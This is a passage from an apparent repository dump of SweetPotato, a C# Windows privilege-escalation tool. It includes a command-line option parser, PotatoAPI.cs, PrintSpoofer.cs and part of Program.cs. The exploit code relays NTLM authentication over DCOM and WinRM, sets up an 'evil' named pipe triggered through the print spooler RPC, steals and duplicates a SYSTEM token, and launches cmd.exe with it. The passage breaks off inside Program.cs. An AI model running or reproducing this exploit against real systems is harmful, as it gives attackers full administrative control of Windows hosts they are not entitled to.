OnParseComplete(OptionContext c) {\n            commands.showHelp = true;\n\n            option?.InvokeOnParseComplete(c);\n        }\n    }\n\n    class CommandOptionSet : OptionSet {\n        CommandSet commands;\n\n        public CommandOptionSet(CommandSet commands, MessageLocalizerConverter localizer)\n            : base(localizer) {\n            this.commands = commands;\n        }\n\n        protected override void SetItem(int index, Option item) {\n            if (ShouldWrapOption(item)) {\n                base.SetItem(index, new HelpOption(commands, item));\n                return;\n            }\n            base.SetItem(index, item);\n        }\n\n        bool ShouldWrapOption(Option item) {\n            if (item == null)\n                return false;\n            var help = item as HelpOption;\n            if (help != null)\n                return false;\n            foreach (var n in item.Names) {\n                if (n == \"help\")\n                    return true;\n            }\n            return false;\n        }\n\n        protected override void InsertItem(int index, Option item) {\n            if (ShouldWrapOption(item)) {\n                base.InsertItem(index, new HelpOption(commands, item));\n                return;\n            }\n            base.InsertItem(index, item);\n        }\n    }\n\n    internal class CommandSet : KeyedCollection<string, Command> {\n        readonly string suite;\n\n        OptionSet options;\n        TextWriter outWriter;\n        TextWriter errorWriter;\n\n        internal List<CommandSet> NestedCommandSets;\n\n        internal HelpCommand help;\n\n        internal bool showHelp;\n\n        internal OptionSet Options => options;\n\n#if !PCL || NETSTANDARD1_3\n        public CommandSet(string suite, MessageLocalizerConverter localizer = null)\n            : this(suite, Console.Out, Console.Error, localizer) {\n        }\n#endif\n\n        public CommandSet(string suite, TextWriter output, TextWriter error, MessageLocalizerConverter localizer = null) {\n            if (suite == null)\n                throw new ArgumentNullException(nameof(suite));\n            if (output == null)\n                throw new ArgumentNullException(nameof(output));\n            if (error == null)\n                throw new ArgumentNullException(nameof(error));\n\n            this.suite = suite;\n            options = new CommandOptionSet(this, localizer);\n            outWriter = output;\n            errorWriter = error;\n        }\n\n        public string Suite => suite;\n        public TextWriter Out => outWriter;\n        public TextWriter Error => errorWriter;\n        public MessageLocalizerConverter MessageLocalizer => options.MessageLocalizer;\n\n        protected override string GetKeyForItem(Command item) {\n            return item?.Name;\n        }\n\n        public new CommandSet Add(Command value) {\n            if (value == null)\n                throw new ArgumentNullException(nameof(value));\n            AddCommand(value);\n            options.Add(new CommandOption(value));\n            return this;\n        }\n\n        void AddCommand(Command value) {\n            if (value.CommandSet != null && value.CommandSet != this) {\n                throw new ArgumentException(\"Command instances can only be added to a single CommandSet.\", nameof(value));\n            }\n            value.CommandSet = this;\n            if (value.Options != null) {\n                value.Options.MessageLocalizer = options.MessageLocalizer;\n            }\n\n            base.Add(value);\n\n            help = help ?? value as HelpCommand;\n        }\n\n        public CommandSet Add(string header) {\n            options.Add(header);\n            return this;\n        }\n\n        public CommandSet Add(Option option) {\n            options.Add(option);\n            return this;\n        }\n\n        public CommandSet Add(string prototype, Action<string> action) {\n            options.Add(prototype, action);\n            return this;\n        }\n\n        public CommandSet Add(string prototype, string description, Action<string> action) {\n            options.Add(prototype, description, action);\n            return this;\n        }\n\n        public CommandSet Add(string prototype, string description, Action<string> action, bool hidden) {\n            options.Add(prototype, description, action, hidden);\n            return this;\n        }\n\n        public CommandSet Add(string prototype, OptionAction<string, string> action) {\n            options.Add(prototype, action);\n            return this;\n        }\n\n        public CommandSet Add(string prototype, string description, OptionAction<string, string> action) {\n            options.Add(prototype, description, action);\n            return this;\n        }\n\n        public CommandSet Add(string prototype, string description, OptionAction<string, string> action, bool hidden) {\n            options.Add(prototype, description, action, hidden);\n            return this;\n        }\n\n        public CommandSet Add<T>(string prototype, Action<T> action) {\n            options.Add(prototype, null, action);\n            return this;\n        }\n\n        public CommandSet Add<T>(string prototype, string description, Action<T> action) {\n            options.Add(prototype, description, action);\n            return this;\n        }\n\n        public CommandSet Add<TKey, TValue>(string prototype, OptionAction<TKey, TValue> action) {\n            options.Add(prototype, action);\n            return this;\n        }\n\n        public CommandSet Add<TKey, TValue>(string prototype, string description, OptionAction<TKey, TValue> action) {\n            options.Add(prototype, description, action);\n            return this;\n        }\n\n        public CommandSet Add(ArgumentSource source) {\n            options.Add(source);\n            return this;\n        }\n\n        public CommandSet Add(CommandSet nestedCommands) {\n            if (nestedCommands == null)\n                throw new ArgumentNullException(nameof(nestedCommands));\n\n            if (NestedCommandSets == null) {\n                NestedCommandSets = new List<CommandSet>();\n            }\n\n            if (!AlreadyAdded(nestedCommands)) {\n                NestedCommandSets.Add(nestedCommands);\n                foreach (var o in nestedCommands.options) {\n                    if (o is CommandOption c) {\n                        options.Add(new CommandOption(c.Command, $\"{nestedCommands.Suite} {c.CommandName}\"));\n                    } else {\n                        options.Add(o);\n                    }\n                }\n            }\n\n            nestedCommands.options = this.options;\n            nestedCommands.outWriter = this.outWriter;\n            nestedCommands.errorWriter = this.errorWriter;\n\n            return this;\n        }\n\n        bool AlreadyAdded(CommandSet value) {\n            if (value == this)\n                return true;\n            if (NestedCommandSets == null)\n                return false;\n            foreach (var nc in NestedCommandSets) {\n                if (nc.AlreadyAdded(value))\n                    return true;\n            }\n            return false;\n        }\n\n        public IEnumerable<string> GetCompletions(string prefix = null) {\n            string rest;\n            ExtractToken(ref prefix, out rest);\n\n            foreach (var command in this) {\n                if (command.Name.StartsWith(prefix, StringComparison.OrdinalIgnoreCase)) {\n                    yield return command.Name;\n                }\n            }\n\n            if (NestedCommandSets == null)\n                yield break;\n\n            foreach (var subset in NestedCommandSets) {\n                if (subset.Suite.StartsWith(prefix, StringComparison.OrdinalIgnoreCase)) {\n                    foreach (var c in subset.GetCompletions(rest)) {\n                        yield return $\"{subset.Suite} {c}\";\n                    }\n                }\n            }\n        }\n\n        static void ExtractToken(ref string input, out string rest) {\n            rest = \"\";\n            input = input ?? \"\";\n\n            int top = input.Length;\n            for (int i = 0; i < top; i++) {\n                if (char.IsWhiteSpace(input[i]))\n                    continue;\n\n                for (int j = i; j < top; j++) {\n                    if (char.IsWhiteSpace(input[j])) {\n                        rest = input.Substring(j).Trim();\n                        input = input.Substring(i, j).Trim();\n                        return;\n                    }\n                }\n                rest = \"\";\n                if (i != 0)\n                    input = input.Substring(i).Trim();\n                return;\n            }\n        }\n\n        public int Run(IEnumerable<string> arguments) {\n            if (arguments == null)\n                throw new ArgumentNullException(nameof(arguments));\n\n            this.showHelp = false;\n            if (help == null) {\n                help = new HelpCommand();\n                AddCommand(help);\n            }\n            Action<string> setHelp = v => showHelp = v != null;\n            if (!options.Contains(\"help\")) {\n                options.Add(\"help\", \"\", setHelp, hidden: true);\n            }\n            if (!options.Contains(\"?\")) {\n                options.Add(\"?\", \"\", setHelp, hidden: true);\n            }\n            var extra = options.Parse(arguments);\n            if (extra.Count == 0) {\n                if (showHelp) {\n                    return help.Invoke(extra);\n                }\n                Out.WriteLine(options.MessageLocalizer($\"Use `{Suite} help` for usage.\"));\n                return 1;\n            }\n            var command = GetCommand(extra);\n            if (command == null) {\n                help.WriteUnknownCommand(extra[0]);\n                return 1;\n            }\n            if (showHelp) {\n                if (command.Options?.Contains(\"help\") ?? true) {\n                    extra.Add(\"--help\");\n                    return command.Invoke(extra);\n                }\n                command.Options.WriteOptionDescriptions(Out);\n                return 0;\n            }\n            return command.Invoke(extra);\n        }\n\n        internal Command GetCommand(List<string> extra) {\n            return TryGetLocalCommand(extra) ?? TryGetNestedCommand(extra);\n        }\n\n        Command TryGetLocalCommand(List<string> extra) {\n            var name = extra[0];\n            if (Contains(name)) {\n                extra.RemoveAt(0);\n                return this[name];\n            }\n            for (int i = 1; i < extra.Count; ++i) {\n                name = name + \" \" + extra[i];\n                if (!Contains(name))\n                    continue;\n                extra.RemoveRange(0, i + 1);\n                return this[name];\n            }\n            return null;\n        }\n\n        Command TryGetNestedCommand(List<string> extra) {\n            if (NestedCommandSets == null)\n                return null;\n\n            var nestedCommands = NestedCommandSets.Find(c => c.Suite == extra[0]);\n            if (nestedCommands == null)\n                return null;\n\n            var extraCopy = new List<string>(extra);\n            extraCopy.RemoveAt(0);\n            if (extraCopy.Count == 0)\n                return null;\n\n            var command = nestedCommands.GetCommand(extraCopy);\n            if (command != null) {\n                extra.Clear();\n                extra.AddRange(extraCopy);\n                return command;\n            }\n            return null;\n        }\n    }\n\n    internal class HelpCommand : Command {\n        public HelpCommand()\n            : base(\"help\", help: \"Show this message and exit\") {\n        }\n\n        public override int Invoke(IEnumerable<string> arguments) {\n            var extra = new List<string>(arguments ?? new string[0]);\n            var _ = CommandSet.Options.MessageLocalizer;\n            if (extra.Count == 0) {\n                CommandSet.Options.WriteOptionDescriptions(CommandSet.Out);\n                return 0;\n            }\n            var command = CommandSet.GetCommand(extra);\n            if (command == this || extra.Contains(\"--help\")) {\n                CommandSet.Out.WriteLine(_($\"Usage: {CommandSet.Suite} COMMAND [OPTIONS]\"));\n                CommandSet.Out.WriteLine(_($\"Use `{CommandSet.Suite} help COMMAND` for help on a specific command.\"));\n                CommandSet.Out.WriteLine();\n                CommandSet.Out.WriteLine(_($\"Available commands:\"));\n                CommandSet.Out.WriteLine();\n                var commands = GetCommands();\n                commands.Sort((x, y) => string.Compare(x.Key, y.Key, StringComparison.OrdinalIgnoreCase));\n                foreach (var c in commands) {\n                    if (c.Key == \"help\") {\n                        continue;\n                    }\n                    CommandSet.Options.WriteCommandDescription(CommandSet.Out, c.Value, c.Key);\n                }\n                CommandSet.Options.WriteCommandDescription(CommandSet.Out, CommandSet.help, \"help\");\n                return 0;\n            }\n            if (command == null) {\n                WriteUnknownCommand(extra[0]);\n                return 1;\n            }\n            if (command.Options != null) {\n                command.Options.WriteOptionDescriptions(CommandSet.Out);\n                return 0;\n            }\n            return command.Invoke(new[] { \"--help\" });\n        }\n\n        List<KeyValuePair<string, Command>> GetCommands() {\n            var commands = new List<KeyValuePair<string, Command>>();\n\n            foreach (var c in CommandSet) {\n                commands.Add(new KeyValuePair<string, Command>(c.Name, c));\n            }\n\n            if (CommandSet.NestedCommandSets == null)\n                return commands;\n\n            foreach (var nc in CommandSet.NestedCommandSets) {\n                AddNestedCommands(commands, \"\", nc);\n            }\n\n            return commands;\n        }\n\n        void AddNestedCommands(List<KeyValuePair<string, Command>> commands, string outer, CommandSet value) {\n            foreach (var v in value) {\n                commands.Add(new KeyValuePair<string, Command>($\"{outer}{value.Suite} {v.Name}\", v));\n            }\n            if (value.NestedCommandSets == null)\n                return;\n            foreach (var nc in value.NestedCommandSets) {\n                AddNestedCommands(commands, $\"{outer}{value.Suite} \", nc);\n            }\n        }\n\n        internal void WriteUnknownCommand(string unknownCommand) {\n            CommandSet.Error.WriteLine(CommandSet.Options.MessageLocalizer($\"{CommandSet.Suite}: Unknown command: {unknownCommand}\"));\n            CommandSet.Error.WriteLine(CommandSet.Options.MessageLocalizer($\"{CommandSet.Suite}: Use `{CommandSet.Suite} help` for usage.\"));\n        }\n    }\n}\n"
        },
        {
          "name": "PotatoAPI.cs",
          "type": "blob",
          "size": 10.9736328125,
          "content": "﻿using System;\r\nusing System.Collections.Generic;\r\nusing System.Net;\r\nusing System.Net.Sockets;\r\nusing System.Text;\r\nusing System.Text.RegularExpressions;\r\nusing System.Threading;\r\n\r\nnamespace SweetPotato {\r\n\r\n    public enum ExecutionMethod {\r\n        Auto,\r\n        Token,\r\n        User\r\n    }\r\n\r\n    internal class PotatoAPI {\r\n\r\n        Thread comListener;\r\n        Thread winRMListener;\r\n        PrintSpoofer printSpoofer;\r\n        EfsRpc efsRpc;\r\n        LocalNegotiator negotiator = new LocalNegotiator();\r\n        Guid clsId;\r\n        readonly int port;\r\n        Mode mode;\r\n        volatile bool dcomComplete = false;\r\n\r\n        public enum Mode {\r\n            DCOM,\r\n            WinRM,\r\n            EfsRpc,\r\n            PrintSpoofer\r\n        }\r\n\r\n        public IntPtr Token {\r\n            get {\r\n                if (mode == Mode.DCOM || mode == Mode.WinRM) {\r\n                    return negotiator.Token;\r\n                } else if (mode == Mode.EfsRpc) {\r\n                    return efsRpc.Token;\r\n                } else {\r\n                    return printSpoofer.Token;\r\n                }   \r\n            }\r\n        }\r\n\r\n        EventWaitHandle readyEvent = new EventWaitHandle(false, EventResetMode.AutoReset);\r\n\r\n        public PotatoAPI(Guid clsId, ushort port, Mode mode) {\r\n\r\n            this.clsId = clsId;\r\n            this.port = port;\r\n            this.mode = mode;\r\n\r\n            switch (mode) {\r\n                case Mode.DCOM:\r\n                    StartCOMListenerThread();\r\n                    break;\r\n                case Mode.WinRM:\r\n                    StartWinRMThread();\r\n                    break;\r\n                case Mode.EfsRpc:\r\n                    efsRpc = new EfsRpc();\r\n                    break;\r\n                case Mode.PrintSpoofer:\r\n                    printSpoofer = new PrintSpoofer();\r\n                    break;\r\n            }                         \r\n        }\r\n\r\n        public Thread StartWinRMThread() {\r\n            winRMListener = new Thread(WinRMListener);\r\n            winRMListener.Start();\r\n            return winRMListener;\r\n        }\r\n\r\n        public Thread StartCOMListenerThread() {\r\n            comListener = new Thread(COMListener);\r\n            comListener.Start();\r\n            return comListener;\r\n        }\r\n\r\n        string GetAuthorizationHeader(Socket socket) {\r\n\r\n            byte[] buffer = new byte[8192];\r\n            int len = socket.Receive(buffer);\r\n\r\n            string authRequest = Encoding.ASCII.GetString(buffer);\r\n\r\n            Regex rx = new Regex(@\"Authorization: Negotiate (?<neg>.*)\");\r\n            MatchCollection matches = rx.Matches(authRequest);\r\n\r\n            if(matches.Count == 0) {\r\n                return null;\r\n            }\r\n\r\n            return matches[0].Groups[\"neg\"].Value;           \r\n        }\r\n\r\n        void WinRMListener() {\r\n\r\n            Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\r\n            listenSocket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, 1);\r\n\r\n            listenSocket.Bind(new IPEndPoint(IPAddress.Loopback, 5985));\r\n            listenSocket.Listen(10);\r\n            readyEvent.Set();\r\n\r\n            while (!listenSocket.Poll(100000, SelectMode.SelectRead)) {\r\n                if (dcomComplete)\r\n                    return;\r\n            }\r\n\r\n            Socket clientSocket = listenSocket.Accept();\r\n\r\n            string authHeader = GetAuthorizationHeader(clientSocket);\r\n\r\n            try {\r\n                if (!negotiator.HandleType1(Convert.FromBase64String(authHeader))) {\r\n                    Console.Write(\"[!] Failed to handle type SPNEGO\");\r\n                    clientSocket.Close();\r\n                    listenSocket.Close();\r\n                    return;\r\n                }\r\n            } catch (FormatException) {\r\n                Console.Write(\"[!] Failed to parse SPNEGO Base64 buffer\");\r\n                return;\r\n            }\r\n                        \r\n            string challengeResponse = String.Format(\r\n                \"HTTP/1.1 401 Unauthorized\\n\" +\r\n                \"WWW-Authenticate: Negotiate {0}\\n\" +\r\n                \"Content-Length: 0\\n\" +\r\n                \"Connection: Keep-Alive\\n\\n\",\r\n                Convert.ToBase64String(negotiator.Challenge)\r\n                ); \r\n\r\n            clientSocket.Send(Encoding.ASCII.GetBytes(challengeResponse));\r\n            authHeader = GetAuthorizationHeader(clientSocket);\r\n\r\n            try {\r\n                negotiator.HandleType3(Convert.FromBase64String(authHeader));\r\n            } catch (FormatException) {\r\n                Console.WriteLine(\"[!] Failed to parse SPNEGO Auth packet\");\r\n            }\r\n\r\n            clientSocket.Close();\r\n            listenSocket.Close();\r\n        }\r\n\r\n        void COMListener() {\r\n\r\n            try {\r\n                Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\r\n                listenSocket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, 1);\r\n\r\n                listenSocket.Bind(new IPEndPoint(IPAddress.Loopback, port));\r\n                listenSocket.Listen(10);\r\n                readyEvent.Set();\r\n\r\n                while (!listenSocket.Poll(100000, SelectMode.SelectRead)) {\r\n                    if (dcomComplete)\r\n                        return;\r\n                }\r\n\r\n                Socket clientSocket = listenSocket.Accept();\r\n                Socket rpcSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\r\n                rpcSocket.Connect(new IPEndPoint(IPAddress.Loopback, 135));\r\n\r\n                byte[] buffer = new byte[4096];\r\n                int recvLen = 0;\r\n                int sendLen = 0;\r\n\r\n                while ((recvLen = clientSocket.Receive(buffer)) > 0) {\r\n                    byte[] received = new byte[recvLen];\r\n                    Array.Copy(buffer, received, received.Length);\r\n\r\n                    ProcessNTLMBytes(received);\r\n\r\n                    if (negotiator.Authenticated) {\r\n                        break;\r\n                    }\r\n\r\n                    sendLen = rpcSocket.Send(received);\r\n                    recvLen = rpcSocket.Receive(buffer);\r\n\r\n                    if (recvLen == 0) {\r\n                        break;\r\n                    }\r\n\r\n                    received = new byte[recvLen];\r\n                    Array.Copy(buffer, received, received.Length);\r\n\r\n                    ProcessNTLMBytes(received);\r\n                    sendLen = clientSocket.Send(received);\r\n\r\n                    if (listenSocket.Poll(100000, SelectMode.SelectRead)) {\r\n                        clientSocket.Close();\r\n                        clientSocket = listenSocket.Accept();\r\n                        rpcSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\r\n                        rpcSocket.Connect(new IPEndPoint(IPAddress.Loopback, 135));\r\n                    }\r\n                }\r\n\r\n                try {\r\n                    clientSocket.Close();\r\n                    rpcSocket.Close();\r\n                    listenSocket.Close();\r\n                } finally { }\r\n                                   \r\n            } catch (Exception e) {\r\n                Console.WriteLine(\"[!] COM Listener thread failed: {0}\", e.Message);\r\n                readyEvent.Set();\r\n            }\r\n        }\r\n\r\n        public bool Trigger() {\r\n\r\n            bool result = false;\r\n\r\n            try {\r\n\r\n                switch (mode) {\r\n\r\n                    case Mode.DCOM:\r\n\r\n                        Ole32.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes);\r\n                        Ole32.StgCreateDocfileOnILockBytes(lockBytes, Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE, 0, out IStorage storage);\r\n                        StorageTrigger storageTrigger = new StorageTrigger(storage, string.Format(\"127.0.0.1[{0}]\", port), TowerProtocol.EPM_PROTOCOL_TCP);\r\n\r\n                        Ole32.MULTI_QI[] qis = new Ole32.MULTI_QI[1];\r\n                        qis[0].pIID = Ole32.IID_IUnknownPtr;\r\n\r\n                        Ole32.CoGetInstanceFromIStorage(null, ref clsId, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, storageTrigger, 1, qis);\r\n                        result = negotiator.Authenticated;\r\n                        break;\r\n\r\n                    case Mode.WinRM:\r\n\r\n                        Type comType = Type.GetTypeFromCLSID(clsId);\r\n                        var instance = Activator.CreateInstance(comType);\r\n                        result = negotiator.Authenticated;\r\n                        break;\r\n\r\n                    case Mode.EfsRpc:\r\n\r\n                        efsRpc.TriggerEfsRpc();\r\n                        if(efsRpc.Token != IntPtr.Zero) {\r\n                            result = true;\r\n                        }\r\n                        break;\r\n\r\n                    case Mode.PrintSpoofer:\r\n\r\n                        printSpoofer.TriggerPrintSpoofer();\r\n                        if(printSpoofer.Token != IntPtr.Zero) {\r\n                            result = true;\r\n                        }\r\n                        break;\r\n                }\r\n          \r\n            } catch (Exception e) {\r\n                if (!negotiator.Authenticated)\r\n                    Console.Write(String.Format(\"{0}\\n\", e.Message));\r\n            }\r\n\r\n            dcomComplete = true;\r\n            return result;\r\n        }\r\n\r\n        int FindNTLMBytes(byte[] bytes) {\r\n            //Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.\r\n            //The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,\r\n            //we can just return the index\r\n            byte[] pattern = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };\r\n            int pIdx = 0;\r\n            int i;\r\n            for (i = 0; i < bytes.Length; i++) {\r\n                if (bytes[i] == pattern[pIdx]) {\r\n                    pIdx = pIdx + 1;\r\n                    if (pIdx == 7) return (i - 6);\r\n                } else {\r\n                    pIdx = 0;\r\n                }\r\n            }\r\n            return -1;\r\n        }\r\n\r\n        int ProcessNTLMBytes(byte[] bytes) {\r\n\r\n            int ntlmLoc = FindNTLMBytes(bytes);\r\n            if (ntlmLoc == -1) return -1;\r\n\r\n            byte[] ntlm = new byte[bytes.Length - ntlmLoc];\r\n            Array.Copy(bytes, ntlmLoc, ntlm, 0, ntlm.Length);\r\n\r\n            int messageType = bytes[ntlmLoc + 8];\r\n            switch (messageType) {\r\n                case 1:\r\n                    //NTLM type 1 message\r\n                    negotiator.HandleType1(ntlm);\r\n                    return 0;\r\n                case 2:\r\n                    //NTLM type 2 message\r\n                    int result = negotiator.HandleType2(ntlm);\r\n                    Array.Copy(ntlm, 0, bytes, ntlmLoc, ntlm.Length);\r\n                    return result;\r\n\r\n                case 3:\r\n                    //NTLM type 3 message\r\n                    return negotiator.HandleType3(ntlm);\r\n                default:\r\n                    Console.WriteLine(\"Error - Unknown NTLM message type...\");\r\n                    return -1;\r\n            }\r\n        }\r\n    }\r\n}\r\n"
        },
        {
          "name": "PrintSpoofer.cs",
          "type": "blob",
          "size": 2.93359375,
          "content": "﻿using NtApiDotNet.Ndr.Marshal;\nusing NtApiDotNet.Win32;\nusing rpc_12345678_1234_abcd_ef00_0123456789ab_1_0;\nusing System;\nusing System.Collections.Generic;\nusing System.IO.Pipes;\nusing System.Linq;\nusing System.Text;\nusing System.Threading;\nusing System.Threading.Tasks;\n\nnamespace SweetPotato {\n    internal class PrintSpoofer {\n\n        static int PRINTER_CHANGE_ADD_JOB = 0x00000100;\n\n        string pipeName = Guid.NewGuid().ToString();\n        string hostName = System.Net.Dns.GetHostName();\n\n        NamedPipeServerStream spoolPipe;\n        Thread spoolPipeThread;\n        IntPtr systemImpersonationToken = IntPtr.Zero;\n\n        public IntPtr Token { get {return systemImpersonationToken; } }\n\n        void SpoolPipeThread() {\n\n            byte[] data = new byte[4];\n\n            spoolPipe = new NamedPipeServerStream($\"{pipeName}\\\\pipe\\\\spoolss\", PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 2048, 2048);\n            spoolPipe.WaitForConnection();\n\n            Console.WriteLine(\"[+] Server connected to our evil RPC pipe\");\n\n            spoolPipe.Read(data, 0, 4);\n\n            spoolPipe.RunAsClient(() => {\n                if (!ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(),\n                    ImpersonationToken.TOKEN_ALL_ACCESS, false, out var tokenHandle)) {\n                    Console.WriteLine(\"[-] Failed to open thread token\");\n                    return;\n                }\n\n                if (!ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,\n                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,\n                    ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken)) {\n                    Console.WriteLine(\"[-] Failed to duplicate impersonation token\");\n                    return;\n                }\n                \n                Console.WriteLine(\"[+] Duplicated impersonation token ready for process creation\");\n            });\n\n            spoolPipe.Close();\n        }\n\n        public PrintSpoofer() {\n            spoolPipeThread = new Thread(SpoolPipeThread);\n            spoolPipeThread.Start();\n        }\n\n        public void TriggerPrintSpoofer() {\n\n            string captureServer = string.Format($\"\\\\\\\\{hostName}/pipe/{pipeName}\");\n            string printerHost = string.Format($\"\\\\\\\\{hostName}\");\n\n            Client c = new Client();\n            c.Connect();\n\n            Struct_0 devModeContainer = new Struct_0();\n\n            if (c.RpcOpenPrinter(printerHost, out var handle, null, devModeContainer, 0) != 0) {\n                Console.WriteLine(\"[-] Failed to open printer over RPC\");\n                return;\n            }\n\n            Console.WriteLine($\"[+] Triggering notification on evil PIPE {captureServer}\");\n            c.RpcRemoteFindFirstPrinterChangeNotificationEx(handle, PRINTER_CHANGE_ADD_JOB, 0, captureServer, 0, null);\n            c.RpcClosePrinter(ref handle);\n        }\n    }\n}\n"
        },
        {
          "name": "Program.cs",
          "type": "blob",
          "size": 6.6708984375,
          "content": "﻿using Microsoft.Win32;\r\nusing Mono.Options;\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\nusing System.Security.Principal;\r\nusing System.Threading;\r\nusing static SweetPotato.ImpersonationToken;\r\n\r\nnamespace SweetPotato {\r\n    class Program {\r\n\r\n        static void PrintHelp(OptionSet options) {                \r\n            options.WriteOptionDescriptions(Console.Out);\r\n        }\r\n\r\n        static void Main(string[] args) {\r\n\r\n            string clsId = \"4991D34B-80A1-4291-83B6-3328366B9097\";\r\n            ushort port = 6666;\r\n            string program = @\"c:\\Windows\\System32\\cmd.exe\";\r\n            string programArgs = null;\r\n            ExecutionMethod executionMethod = ExecutionMethod.Auto;\r\n            PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;\r\n            bool showHelp = false;\r\n            bool isBITSRequired = false;\r\n\r\n            Console.WriteLine(\r\n                \"SweetPotato by @_EthicalChaos_\\n\" +\r\n                 \"  Orignal RottenPotato code and exploit by @foxglovesec\\n\" +\r\n                 \"  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\\n\" + \r\n                 \"  PrintSpoofer discovery and original exploit by @itm4n\\n\" +\r\n                 \"  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam\"\r\n                );\r\n\r\n            OptionSet option_set = new OptionSet()\r\n                .Add<string>(\"c=|clsid=\", \"CLSID (default BITS:\\n4991D34B-80A1-4291-83B6-3328366B9097)\", v => clsId = v)\r\n                .Add<ExecutionMethod>(\"m=|method=\", \"Auto,User,Thread (default Auto)\", v => executionMethod = v)\r\n                .Add(\"p=|prog=\", \"Program to launch (default cmd.exe)\", v => program = v)\r\n                .Add(\"a=|args=\", \"Arguments for program (default null)\", v => programArgs = v)\r\n                .Add<PotatoAPI.Mode>(\"e=|exploit=\", \"Exploit mode\\n[DCOM|WinRM|EfsRpc|PrintSpoofer(default)] \", v => mode = v)\r\n                .Add<ushort>(\"l=|listenPort=\", \"COM server listen port (default 6666)\", v => port = v)\r\n                .Add(\"h|help\", \"Display this help\", v => showHelp = v != null);\r\n\r\n\r\n            try {\r\n\r\n                option_set.Parse(args);\r\n\r\n                if (showHelp) {\r\n                    PrintHelp(option_set);\r\n                    return;\r\n                }\r\n\r\n            } catch (Exception e) {\r\n                Console.WriteLine(\"[!] Failed to parse arguments: {0}\", e.Message);\r\n                PrintHelp(option_set);\r\n                return;\r\n            }\r\n\r\n            try {\r\n\r\n                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);\r\n                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);\r\n                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);\r\n\r\n                if(!hasImpersonate && !hasPrimary) {\r\n                    Console.WriteLine(\"[!] Cannot perform interception, necessary privileges missing.  Are you running under a Service account?\");\r\n                    return;\r\n                }\r\n\r\n                if (executionMethod == ExecutionMethod.Auto) {\r\n                    if (hasImpersonate) {\r\n                        executionMethod = ExecutionMethod.Token;\r\n                    } else if (hasPrimary) {\r\n                        executionMethod = ExecutionMethod.User;\r\n                    }\r\n                }\r\n\r\n                if (mode == PotatoAPI.Mode.PrintSpoofer) {\r\n                    Console.WriteLine($\"[+] Attempting NP impersonation using method PrintSpoofer to launch {program}\");\r\n                } else if (mode == PotatoAPI.Mode.EfsRpc) {\r\n                    Console.WriteLine($\"[+] Attempting NP impersonation using method EfsRpc to launch {program}\");\r\n                } else {\r\n                    Console.WriteLine(\"[+] Attempting {0} with CLID {1} on port {2} using method {3} to launch {4}\",\r\n                    isBITSRequired ? \"NTLM Auth\" : \"DCOM NTLM interception\", clsId, isBITSRequired ? 5985 : port, executionMethod, program);\r\n                }\r\n\r\n                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);\r\n\r\n                if (!potatoAPI.Trigger()) {\r\n                    Console.WriteLine(\"[!] No authenticated interception took place, exploit failed\");\r\n                    return;\r\n                }\r\n\r\n                Console.WriteLine(\"[+] Intercepted and authenticated successfully, launching program\");\r\n\r\n                IntPtr impersonatedPrimary;\r\n\r\n                if (!DuplicateTokenEx(potatoAPI.Token, TOKEN_ALL_ACCESS, IntPtr.Zero,\r\n                    SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, TOKEN_TYPE.TokenPrimary, out impersonatedPrimary)) {\r\n                    Console.WriteLine(\"[!] Failed to impersonate security context token\");\r\n                    return;\r\n                }\r\n\r\n                Thread systemThread = new Thread(() => {\r\n                    SetThreadToken(IntPtr.Zero, potatoAPI.Token);\r\n                    STARTUPINFO si = new STARTUPINFO();\r\n                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();\r\n                    si.cb = Marshal.SizeOf(si);\r\n                    si.lpDesktop = @\"WinSta0\\Default\";\r\n\r\n                    //Console.WriteLine(\"[+] Created launch thread using impersonated user {0}\", WindowsIdentity.GetCurrent(true).Name);\r\n\r\n                    string finalArgs = null;\r\n\r\n                    if(programArgs != null)\r\n                        finalArgs = string.Format(\"\\\"{0}\\\" {1}\", program, programArgs);\r\n\r\n                    if (executionMethod == ExecutionMethod.Token) {\r\n                        if (!CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi)) {\r\n                            Console.WriteLine(\"[!] Failed to created impersonated process with token: {0}\", Marshal.GetLastWin32Error());\r\n                            return;\r\n                        }\r\n                    } else {\r\n                        if (!CreateProcessAsUserW(impersonatedPrimary, program, finalArgs, IntPtr.Zero,\r\n                            IntPtr.Zero, false, CREATE_NEW_CONSOLE, IntPtr.Zero, @\"C:\\\", ref si, out pi)) {\r\n                            Console.WriteLine(\"[!] Failed to created impersonated process with user: {0} \", Marshal.GetLastWin32Error());\r\n                            return;\r\n                        }\r\n                    }\r\n                    Console.WriteLine(\"[+] Process created, enjoy!\");\r\n                });\r\n\r\n                systemThread.Start();\r\n                